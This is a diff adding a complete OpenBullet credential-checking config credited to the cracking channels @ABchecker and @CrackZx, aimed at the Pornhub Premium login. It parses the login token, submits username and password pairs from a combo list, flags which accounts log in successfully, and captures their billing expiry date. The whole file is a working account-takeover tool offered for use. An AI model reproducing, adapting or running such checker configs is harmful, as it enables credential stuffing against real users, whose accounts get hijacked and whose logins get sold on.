@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "PORNHUB   @ABchecker  @CrackZx",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-14T16:17:39.1209905+01:00",
+  "AdditionalInfo": "Channel: @ABchecker  @CrackZx",
+  "Author": "@Mr_aBa",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#@ABchecker REQUEST GET "https://www.pornhubpremium.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#@ABchecker FUNCTION URLEncode "<USER>" -> VAR "mail" 
+
+#@ABchecker PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"token\" id=\"token\" value=\"" "\" />" -> VAR "token" 
+
+#@ABchecker REQUEST POST "https://www.pornhubpremium.com/front/authenticate" 
+  CONTENT "username=<mail>&password=<PASS>&token=<token>&redirect=&from=pc_premium_login&segment=straight" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.pornhubpremium.com" 
+  HEADER "Origin: https://www.pornhubpremium.com" 
+  HEADER "Referer: https://www.pornhubpremium.com/premium/login" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+#@ABchecker KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":\"1\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "success\":\"0\",\"" 
+
+#@ABchecker REQUEST GET "https://www.pornhubpremium.com/user/manage/start" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#@ABchecker KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Next Billing Date" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "Next Billing Date" 
+
+#@ABchecker PARSE "<SOURCE>" LR "p id=\"expiryDatePremium\">Next Billing Date " "</date></p>" CreateEmpty=FALSE -> CAP "expiry" 
+
